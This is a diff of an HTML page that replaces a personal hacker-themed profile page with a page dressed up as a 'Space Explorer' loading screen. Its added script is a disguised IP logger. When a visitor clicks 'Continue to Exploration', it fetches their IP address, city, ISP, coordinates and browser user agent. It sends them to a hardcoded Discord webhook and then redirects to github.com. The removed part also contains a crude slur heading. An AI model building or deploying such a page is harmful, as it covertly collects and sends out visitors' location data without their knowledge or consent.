@@ -3,251 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UMBX Core</title>
+    <title>Space Explorer</title>
     <style>
-        :root {
-            --bg-color: #0a0a0a;
-            --primary: #00ffaa;
-            --secondary: #ff00aa;
-            --accent: #aa00ff;
-            --text: #e0e0e0;
-            --dark: #111111;
-        }
-        
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background-color: var(--bg-color);
-            color: var(--text);
-            font-family: 'Courier New', monospace;
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-        
-        .noise {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
-            opacity: 0.05;
-            z-index: -1;
-            pointer-events: none;
-        }
-        
-        .grid {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: linear-gradient(var(--primary) 1px, transparent 1px),
-                            linear-gradient(90deg, var(--primary) 1px, transparent 1px);
-            background-size: 40px 40px;
-            opacity: 0.03;
-            z-index: -1;
-            pointer-events: none;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to bottom, #0B0B0F, #171731);
+            color: white;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
         }
         
         .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-        
-        header {
-            padding: 30px 0;
-            position: relative;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
-        }
-        
-        .logo {
-            font-size: 3rem;
-            font-weight: bold;
-            letter-spacing: 2px;
-            text-transform: uppercase;
             text-align: center;
-            margin-bottom: 10px;
-            position: relative;
-            text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary);
-            animation: pulse 3s infinite alternate;
-        }
-        
-        @keyframes pulse {
-            0% { text-shadow: 0 0 10px var(--primary), 0 0 20px var(--primary); }
-            100% { text-shadow: 0 0 15px var(--primary), 0 0 30px var(--primary), 0 0 45px var(--primary); }
-        }
-        
-        .glitch {
             position: relative;
         }
         
-        .glitch::before,
-        .glitch::after {
-            content: 'UMBX Core';
+        .loading-text {
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            opacity: 0;
+            animation: fadeIn 1s ease-in-out forwards;
+        }
+        
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 5px solid rgba(93, 63, 211, 0.3);
+            border-radius: 50%;
+            border-top-color: #5D3FD3;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 2rem;
+        }
+        
+        .stars {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            opacity: 0.8;
+            z-index: -1;
         }
         
-        .glitch::before {
-            color: var(--secondary);
-            animation: glitch 2s infinite;
-            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
-            transform: translate(-5px, -3px);
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: starTwinkle 4s ease-in-out infinite;
         }
         
-        .glitch::after {
-            color: var(--accent);
-            animation: glitch 2s 1s infinite;
-            clip-path: polygon(0 60%, 100% 60%, 100% 100%, 0 100%);
-            transform: translate(5px, 3px);
-        }
-        
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-3px, 3px); }
-            40% { transform: translate(-3px, -3px); }
-            60% { transform: translate(3px, 3px); }
-            80% { transform: translate(3px, -3px); }
-            100% { transform: translate(0); }
-        }
-        
-        .description {
-            text-align: center;
-            font-size: 1.2rem;
-            margin: 20px 0;
-            color: var(--primary);
-        }
-        
-        .links {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            margin: 20px 0;
-        }
-        
-        .link-btn {
-            padding: 8px 20px;
-            border: 1px solid var(--primary);
-            color: var(--primary);
-            text-decoration: none;
+        .continue-btn {
+            display: none;
+            padding: 12px 24px;
+            background-color: #5D3FD3;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 1rem;
+            cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 0 10px #00FFFF;
+            animation: glow 2s ease-in-out infinite alternate;
         }
         
-        .link-btn:hover {
-            background-color: var(--primary);
-            color: var(--dark);
-            box-shadow: 0 0 10px var(--primary);
+        .continue-btn:hover {
+            background-color: #00FFFF;
+            color: #0B0B0F;
         }
         
-        .terminal {
-            margin-top: 20px;
-            background-color: var(--dark);
-            border-radius: 5px;
-            padding: 15px;
-            border: 1px solid var(--primary);
-            text-align: center;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
-        .terminal::before {
-            content: 'UMBX@Core:~$';
-            color: var(--primary);
-            margin-right: 10px;
-        }
-        
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            height: 20px;
-            background-color: var(--primary);
-            animation: blink 1s infinite;
-            vertical-align: middle;
-        }
-        
-        @keyframes blink {
-            0% { opacity: 1; }
-            50% { opacity: 0; }
+        @keyframes fadeIn {
+            0% { opacity: 0; }
             100% { opacity: 1; }
         }
-
-        .hall-of-shame {
-            padding: 40px 0;
-            text-align: center;
-        }
-
-        .shame-title {
-            font-size: 2rem;
-            color: var(--secondary);
-            margin-bottom: 20px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px var(--secondary);
-        }
-
-        .shame-image {
-            max-width: 100%;
-            margin: 0 auto;
-        }
-
-        .shame-image img {
-            max-width: 100%;
-            height: auto;
-            border: 2px solid var(--primary);
-            box-shadow: 0 0 15px var(--primary);
-        }
-
         
-        audio {
-            display: none;
+        @keyframes starTwinkle {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes glow {
+            0% { box-shadow: 0 0 5px #00FFFF; }
+            100% { box-shadow: 0 0 20px #5D3FD3; }
+        }
+        
+        .progress-bar {
+            width: 300px;
+            height: 10px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            width: 0%;
+            background-color: #00FFFF;
+            animation: progress 3s ease-in-out forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
         }
     </style>
 </head>
 <body>
-    <div class="noise"></div>
-    <div class="grid"></div>
-    
-    <header>
-        <div class="container">
-            <h1 class="logo"><span class="glitch">UMBX Core</span></h1>
-            <div class="description">
-                👾 Kali-Developer | Cybersecurity | Data Science 🔧 Python, C#, HTML, CSS
-            </div>
-            <div class="links">
-                <a href="https://github.com/umbx-dot" class="link-btn" target="_blank">GitHub</a>
-                <a href="https://discord.gg/Vw4D63dP" class="link-btn" target="_blank">Discord Server</a>
-                <a href="https://t.me/umbx1" class="link-btn" target="_blank">Telegram</a>
-                <a href="https://umbx.pages.dev/" class="link-btn" target="_blank">Donate</a>
-            </div>
-            <div class="terminal">
-                <span>Contact me: Discord umbxxx#0000 | Telegram @umbx1</span>
-                <span class="cursor"></span>
-            </div>
+    <div class="stars" id="stars"></div>
+    <div class="container">
+        <div class="loading-text">Initializing Space Explorer...</div>
+        <div class="loading-spinner"></div>
+        <div class="progress-bar">
+            <div class="progress"></div>
         </div>
-    </header>
+        <button id="continueBtn" class="continue-btn">Continue to Exploration</button>
+    </div>
 
-    <section class="hall-of-shame">
-        <div class="container">
-            <h2 class="shame-title">Hall of Autism - Что мы говорим три раза?</h2>
-            <div class="shame-image">
-                <img src="https://cdn.discordapp.com/attachments/1347875838292660275/1355943261658812456/image.png?ex=67eac411&is=67e97291&hm=e9c703c476598e27f4a7415b85b93e061612c86a5d01afc4fd1ffbe63ade4764&" alt="Hall of Shame">
-            </div>
-        </div>
-    </section>
-
-    
-    <audio autoplay loop>
-        <source src="https://www.dropbox.com/scl/fi/q1qnixmd56fvayfxbnx65/Whitehard-Taking-Drugs_-Slowed-Hardstyle.mp3?rlkey=go1jsyullfyjyg8svxh3ugpkt&st=8rf77nvr&dl=1" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'920bb4f768faade1',t:'MTc0MjAzODUyMS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+    <script>
+        // Create stars
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 100;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                
+                // Random size between 1 and 3px
+                const size = Math.random() * 2 + 1;
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                
+                // Random position
+                star.style.top = `${Math.random() * 100}%`;
+                star.style.left = `${Math.random() * 100}%`;
+                
+                // Random animation delay
+                star.style.animationDelay = `${Math.random() * 4}s`;
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Show continue button after 3 seconds
+        function showContinueButton() {
+            setTimeout(() => {
+                const continueBtn = document.getElementById('continueBtn');
+                continueBtn.style.display = 'inline-block';
+                continueBtn.style.opacity = '0';
+                
+                // Fade in animation
+                let opacity = 0;
+                const fadeIn = setInterval(() => {
+                    if (opacity >= 1) {
+                        clearInterval(fadeIn);
+                    }
+                    continueBtn.style.opacity = opacity;
+                    opacity += 0.1;
+                }, 100);
+            }, 3000);
+        }
+        
+        // Get IP and location data
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return { error: 'Failed to fetch IP data' };
+            }
+        }
+        
+        // Send data to Discord webhook
+        async function sendToDiscord(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1358462713340236026/gUstsf4TEMqcOrN6b9GEaLja2NXe11ErQlCkeB_Pz2yDcfJNl2ANshC2A9-6-MkqDShI';
+            
+            const embed = {
+                title: "User Information Collected",
+                color: 0x5D3FD3,
+                fields: [
+                    { name: "IP Address", value: data.ip || "Unknown", inline: true },
+                    { name: "Country", value: data.country_name || "Unknown", inline: true },
+                    { name: "Region", value: data.region || "Unknown", inline: true },
+                    { name: "City", value: data.city || "Unknown", inline: true },
+                    { name: "ISP", value: data.org || "Unknown", inline: true },
+                    { name: "Timezone", value: data.timezone || "Unknown", inline: true },
+                    { name: "Location", value: `${data.latitude}, ${data.longitude}` || "Unknown", inline: true },
+                    { name: "User Agent", value: navigator.userAgent, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            
+            const payload = {
+                embeds: [embed]
+            };
+            
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            createStars();
+            showContinueButton();
+            
+            // Add event listener to continue button
+            document.getElementById('continueBtn').addEventListener('click', async () => {
+                const ipInfo = await getIPInfo();
+                await sendToDiscord(ipInfo);
+                
+                // Redirect to a thank you page or another site
+                window.location.href = "https://github.com";
+            });
+        });
+    </script>
 </body>
 </html>
